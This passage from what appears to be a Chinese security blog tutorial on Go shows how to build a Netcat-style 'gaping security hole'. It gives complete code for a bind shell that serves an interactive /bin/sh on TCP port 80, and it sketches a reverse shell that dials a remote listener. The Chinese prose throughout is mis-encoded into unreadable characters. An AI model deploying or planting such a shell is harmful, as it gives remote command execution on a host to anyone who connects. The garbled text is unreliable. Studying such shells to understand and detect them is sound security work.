</span></span></code></pre></div><p>è¿™å°†åˆ›å»º Cmd çš„å®ä¾‹ï¼Œä½†å°šæœªæ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªé€‰é¡¹æ“ä½œ stdin å’Œ stdout ã€‚ä½ å¯ä»¥ä½¿ç”¨å‰é¢è®¨è®ºçš„ Copy(Writer,Reader) æˆ–ç›´æ¥å°† Reader å’Œ Writer èµ‹ç»™ Cmd.è¿™é‡Œç›´æ¥å°† Conn å¯¹è±¡èµ‹ç»™ cmd.Stdin å’Œ cmd.Stdout ,å¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdin</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">conn</span>
</span></span></code></pre></div><p>å®Œæˆå‘½ä»¤å’Œæ•°æ®æµå¤„ç†çš„è®¾ç½®ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨ cmd.Run() è¿è¡Œå‘½ä»¤ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// å¤„ç†é”™è¯¯
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>ä»¥ä¸Šæ“ä½œå¾ˆé€‚åˆåœ¨ Linux ç³»ç»Ÿä¸Šè¿è¡Œã€‚ä½†æ˜¯ï¼Œåœ¨ Windows ç³»ç»Ÿä¸Šè¿è¡Œç¨‹åºæ—¶ï¼Œè‹¥ä½¿ç”¨ cmd.exe è€Œä¸ä½¿ç”¨ /bin/bash ,ä½ ä¼šå‘ç°ç”±äºæŸäº› Windows ç‰¹å®šçš„åŒ¿åç®¡é“å¤„ç†ï¼Œè¿æ¥çš„å®¢æˆ·ç«¯æ°¸è¿œä¸ä¼šæ”¶åˆ°å‘½ä»¤è¾“å‡ºã€‚è§£å†³æ­¤é—®é¢˜æœ‰ä¸¤ç§æ–¹æ¡ˆã€‚</p>
<p>é¦–å…ˆï¼Œå¯ä»¥é€šè¿‡è°ƒæ•´ä»£ç æ˜¾å¼å¼ºåˆ¶åˆ·æ–°æ ‡å‡†è¾“å‡ºä»¥é€‚åº”æ­¤ç»†å¾®å·®åˆ«ã€‚ä¸å†æ˜¯ç›´æ¥å°† Conn èµ‹ç»™ cmd.Stdout ,è€Œæ˜¯å®ç°ä¸€ä¸ªåŒ…è£… bufo.Writer(ä¸€ä¸ªç¼“å†²å†™å…¥å™¨)çš„è‡ªå®šä¹‰ Writer å¹¶æ˜¾å¼è°ƒç”¨å…¶ Flush æ–¹æ³•ä»¥å¼ºåˆ¶åˆ·æ–°è¯¥ç¼“å†²åŒºã€‚</p>
<p>ä»¥ä¸‹æ˜¯è‡ªå®šä¹‰çš„ writer å’Œ Flusherã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// Flusher åŒ…è£… bufio.Writerï¼Œæ˜¾å¼åˆ·æ–°æ‰€æœ‰å†™å…¥
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">Flusher</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">w</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">Writer</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// NewFlusher ä» io.Writeråˆ›å»ºä¸€ä¸ªæ–°çš„ Flusher
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">NewFlusher</span>(<span style="color:#a6e22e">w</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Writer</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">Flusher</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">Flusher</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">w</span>: <span style="color:#a6e22e">bufio</span>.<span style="color:#a6e22e">NewWriter</span>(<span style="color:#a6e22e">w</span>),
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// å†™å…¥æ•°æ®å¹¶æ˜¾å¼åˆ·æ–°ç¼“å†²åŒº
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Flusher</span>) <span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">count</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">b</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">w</span>.<span style="color:#a6e22e">Flush</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">count</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ç±»å‹ Flusher å®ç°äº†å‡½æ•° Write([] byte) ï¼Œè¯¥å‡½æ•°å°†æ•°æ®å†™å…¥åº•å±‚çš„ç¼“å†² writer ,ç„¶ååˆ·æ–°è¾“å‡ºã€‚</p>
<p>ä½¿ç”¨è‡ªå®šä¹‰ writer çš„å®ç°ï¼Œå¯ä»¥è°ƒæ•´è¿æ¥å¤„ç†ç¨‹åºä»¥å®ä¾‹åŒ–æ­¤ Flusher è‡ªå®šä¹‰æ•°æ®ç±»å‹å¹¶å°†å…¶ç”¨äº cmd.Stdoutã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// æ˜¾å¼è°ƒç”¨ /bin/sh å¹¶ä½¿ç”¨ -i è¿›å…¥äº¤äº’æ¨¡å¼
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒä½œä¸ºæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡º
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// å¯¹äº Windows ä½¿ç”¨ exec.Command(&#34;cmd.exe&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// å°†æ ‡å‡†è¾“å…¥è®¾ç½®ä¸ºæˆ‘ä»¬çš„è¿æ¥
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ä»è¿æ¥åˆ›å»ºä¸€ä¸ª Flusher ç”¨äºæ ‡å‡†è¾“å‡º
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// è¿™æ ·å¯ä»¥ç¡®ä¿æ ‡å‡†è¾“å‡ºè¢«å……åˆ†åˆ·æ–°å¹¶é€šè¿‡ net.Conn å‘é€
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">NewFlusher</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// è¿è¡Œå‘½ä»¤
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è¿™ç§è§£å†³æ–¹æ¡ˆè™½ç„¶å¯è¡Œï¼Œä½†å¹¶ä¸æ˜¯å¾ˆä¼˜é›…ã€‚å°½ç®¡èƒ½æ»¡è¶³å·¥ä½œè¦æ±‚çš„ä»£ç è¦æ¯”ä¼˜é›…çš„ä»£ç æ›´é‡è¦ï¼Œä½†æˆ‘ä»¬å°†ä»¥æ­¤é—®é¢˜ä¸ºå¥‘æœºä»‹ç»å‡½æ•° io.Pipe(),è¯¥å‡½æ•°æ˜¯ Go çš„åŒæ­¥å†…å­˜ç®¡é“ï¼Œå¯ç”¨äºè¿æ¥ Reader å’Œ Writer ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// æ˜¾å¼è°ƒç”¨ /bin/sh å¹¶ä½¿ç”¨ -i è¿›å…¥äº¤äº’æ¨¡å¼
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒä½œä¸ºæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡º
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// å¯¹äº Windows ä½¿ç”¨ exec.Command(&#34;cmd.exe&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// å°†æ ‡å‡†è¾“å…¥è®¾ç½®ä¸ºæˆ‘ä»¬çš„è¿æ¥
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">rp</span>, <span style="color:#a6e22e">wp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Pipe</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdin</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">wp</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">rp</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è°ƒç”¨ io.Pipe() ä¼šåŒæ—¶åˆ›å»ºåŒæ­¥è¿æ¥çš„ä¸€ä¸ª reader å’Œä¸€ä¸ª writer â€”â€”ä»»ä½•è¢«å†™å…¥ writer çš„æ•°æ®ï¼ˆåœ¨æœ¬ç¤ºä¾‹ä¸­ä¸º wp )éƒ½ä¼šè¢« reader(rp) è¯»å–ã€‚å› æ­¤ï¼Œéœ€è¦å°† writer åˆ†é…ç»™ cmd.Stdout ï¼Œç„¶åä½¿ç”¨ io.Copy(conn,rp) å°† PipeReader é“¾æ¥åˆ° TCP è¿æ¥ã€‚å¯ä½¿ç”¨ goroutine é˜²æ­¢ä»£ç è¢«é˜»å¡ã€‚å‘½ä»¤çš„ä»»ä½•æ ‡å‡†è¾“å‡ºéƒ½å°†å‘é€åˆ° writer ,ç„¶åé€šè¿‡ç®¡é“ä¼ é€åˆ° reader å¹¶é€šè¿‡ TCP è¿æ¥è¾“å‡ºã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»ä»ç­‰å¾…è¿æ¥çš„ TCP ç›‘å¬å™¨çš„è§’åº¦æˆåŠŸå®ç°äº† Netcat å¼ºå¤§çš„â€œå®‰å…¨å·¨æ´&quot;åŠŸèƒ½ã€‚ä½ å¯ä»¥å‚ç…§æœ¬ç« ç¤ºä¾‹è¯•ç€ä»è¿æ¥å®¢æˆ·ç«¯å°†æœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶çš„ stdout å’Œ stdin é‡å®šå‘åˆ°è¿œç¨‹ç›‘å¬å™¨çš„è§’åº¦æ¥å®ç°è¯¥åŠŸèƒ½ã€‚å…¶å…·ä½“å®ç°ç•™å¾…ä½ å»æŒ–æ˜ï¼Œä¸‹é¢ä»…åˆ—å‡ºå‡ ç‚¹ä¾›ä½ å‚è€ƒã€‚</p>
<ul>
<li>é€šè¿‡ net.Dial(network,address string) å»ºç«‹ä¸è¿œç¨‹ç›‘å¬å™¨çš„è¿æ¥ã€‚</li>
<li>é€šè¿‡ exec.Command(name string,arg..string) åˆå§‹åŒ–ä¸€ä¸ª Cmdã€‚</li>
<li>é‡å®šå‘ Stdin å’Œ Stdout ä»¥åˆ©ç”¨ net.Conn å¯¹è±¡ã€‚</li>
<li>è¿è¡Œå‘½ä»¤ã€‚</li>
</ul>
<p>æ­¤æ—¶ï¼Œä¾¦å¬å™¨åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ªè¿æ¥ã€‚å‘é€åˆ°å®¢æˆ·ç«¯çš„ä»»ä½•æ•°æ®éƒ½åº”åœ¨å®¢æˆ·ç«¯ä¸Šç†è§£ä¸º stdin ,è€Œåœ¨ä¾¦å¬å™¨ä¸Šæ¥æ”¶åˆ°çš„ä»»ä½•æ•°æ®éƒ½åº”ç†è§£ä¸º stdout ã€‚</p>
<p>å®ä¾‹å®Œæ•´ä»£ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os/exec&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Conn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// æ˜¾å¼è°ƒç”¨ /bin/sh å¹¶ä½¿ç”¨ -i è¿›å…¥äº¤äº’æ¨¡å¼
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒä½œä¸ºæ ‡å‡†è¾“å…¥å’Œæ ‡å‡†è¾“å‡º
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// å¯¹äº Windows ä½¿ç”¨ exec.Command(&#34;cmd.exe&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;-i&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// å°†æ ‡å‡†è¾“å…¥è®¾ç½®ä¸ºæˆ‘ä»¬çš„è¿æ¥
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">rp</span>, <span style="color:#a6e22e">wp</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Pipe</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdin</span> = <span style="color:#a6e22e">conn</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Stdout</span> = <span style="color:#a6e22e">wp</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">Copy</span>(<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">rp</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Run</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// åœ¨æœ¬åœ°ç«¯å£ 80 ä¸Šç›‘å¬
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">listener</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Listen</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to bind to port&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">Accept</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatalln</span>(<span style="color:#e6db74">&#34;Unable to accept connection&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">handler</span>(<span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>

        </div>
        <div class="post-reward">
            <div style="padding: 0 0 0 0; margin: 0 0 0 0; width: 100%; font-size:16px; text-align: center;">
                <div id="QR" style="opacity: 0;">
                    <div id="wechat" style="display: inline-block">
                        <a class="fancybox" rel="group">
                            <img id="wechat_qr" src="https://n3bu74.github.io/img/Bilibili.png" alt="wechat_pay"></a>
                        <p>å¾®ä¿¡</p>
                    </div>
                    <div id="alipay" style="display: inline-block">
                        <a class="fancybox" rel="group">
                            <img id="alipay_qr" src="https://n3bu74.github.io/img/Github.png" alt="alipay"></a>
                        <p>æ”¯ä»˜å®</p>
                    </div>
                </div>
                <button id="rewardButton"
                        onclick="
                    var qr = document.getElementById('QR');
                    if (qr.style.opacity === '0') {
                        qr.style.opacity='1';
                    } else {
                        qr.style.opacity='0'
                    }"
                >
                    <span>ğŸ§§ é¼“åŠ±</span>
                </button>
            </div>
        </div>

        <footer class="post-footer">
            
<nav class="paginav">
  <a class="next" href="https://n3bu74.github.io/posts/sec/chinese-remainder-theorem/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>ä¸­å›½å‰©ä½™å®šç†</span>
  </a>
</nav>

        </footer>
    </div>



<div>
    <div class="pagination__title">
        <span class="pagination__title-h" style="font-size: 20px;">ğŸ’¬è¯„è®º</span>
        <hr />
    </div>

    <div id="tcomment"></div>

    <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js">
    </script>
    

    

    <script>
        twikoo.init({
            envId:  null , 
            el: "#tcomment",
            lang: 'zh-CN',
            region:  null ,
            path: window.TWIKOO_MAGIC_PATH||window.location.pathname,
            
            
            
            
            
            
            
        });
    </script>

</div>
</article>
</main>


<script async src="https://unpkg.com/mermaid@8.8.1/dist/mermaid.min.js"></script>


<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<footer class="footer">
    <span>
        Copyright
        &copy;
        2022-2023
        <a href="https://n3bu74.github.io" style="color:#939393;">N3bu74&#39;s Blog</a>
        All Rights Reserved
    </span>

    <a href="https://beian.miit.gov.cn/" target="_blank" style="color:#939393;"></a>&nbsp;

    <span>
        <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=null"
           style="display:inline-block;text-decoration:none;height:20px;color:#939393;">
            <img src="" style="float:left;margin: 0px 5px 0px 0px;"/>
            
        </a>
    </span>

    <span id="busuanzi_container">
        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
        æ€»è®¿å®¢æ•°: <span id="busuanzi_value_site_uv"></span>
        æ€»è®¿é—®é‡: <span id="busuanzi_value_site_pv"></span>
    </span>

</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <span class="topInner">
        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z"/>
        </svg>
        <span id="read_progress"></span>
    </span>
</a>

<script>
    document.addEventListener('scroll', function (e) {
        const readProgress = document.getElementById("read_progress");
        const scrollHeight = document.documentElement.scrollHeight;
        const clientHeight = document.documentElement.clientHeight;
        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
        
        readProgress.innerText = ((scrollTop / (scrollHeight - clientHeight)).toFixed(2) * 100).toFixed(0);
    })
</script>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    let mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 400 || document.documentElement.scrollTop > 400) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };
</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>

<script>
    document.body.addEventListener('copy', function (e) {
        if (window.getSelection().toString() && window.getSelection().toString().length > 50) {
            let clipboardData = e.clipboardData || window.clipboardData;
            if (clipboardData) {
                e.preventDefault();
                let htmlData = window.getSelection().toString() +
                    '\r\n\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\r\n' +
                    'ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºã€Œ' + {
                { .
                    Site.Title
                }
            }
                +'ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚' +
                '\r\nåŸæ–‡é“¾æ¥ï¼š' + location.href;
                let textData = window.getSelection().toString() +
                    '\r\n\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\r\n' +
                    'ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºã€Œ' + {
                { .
                    Site.Title
                }
            }
                +'ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚' +
                '\r\nåŸæ–‡é“¾æ¥ï¼š' + location.href;
                clipboardData.setData('text/html', htmlData);
                clipboardData.setData('text/plain', textData);
            }
        }
    });
</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'ğŸ“„å¤åˆ¶';

        function copyingDone() {
            copybutton.innerText = 'ğŸ‘ŒğŸ»å·²å¤åˆ¶!';
            setTimeout(() => {
                copybutton.innerText = 'ğŸ“„å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                let text = codeblock.textContent +
                    '\r\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\r\n' +
                    'ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºã€Œ' + "N3bu74's Blog"
                +'ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚' +
                '\r\nåŸæ–‡é“¾æ¥ï¼š' + location.href;
                navigator.clipboard.writeText(text);
                copyingDone();
                return;
            }

            const range = document.createRange();
